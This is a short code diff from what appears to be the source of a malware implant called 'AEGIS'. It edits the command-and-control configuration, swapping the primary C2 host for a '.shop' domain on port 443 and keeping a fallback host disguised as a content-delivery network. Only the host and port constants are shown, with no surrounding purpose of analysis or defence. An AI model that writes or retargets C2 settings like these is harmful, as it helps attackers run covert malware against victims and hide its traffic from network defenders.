@@ -19,7 +19,7 @@
 
 /* ── C2 Configuration ────────────────────────────────────────────────────── */
 
-#define AEGIS_C2_PRIMARY_HOST "cdn-assets.legitimate-service.com"
+#define AEGIS_C2_PRIMARY_HOST "cheta4.darkdiamondfront.shop"
 #define AEGIS_C2_PRIMARY_PORT 443
 #define AEGIS_C2_FALLBACK_HOST "static.content-delivery-net.com"
 #define AEGIS_C2_FALLBACK_PORT 443
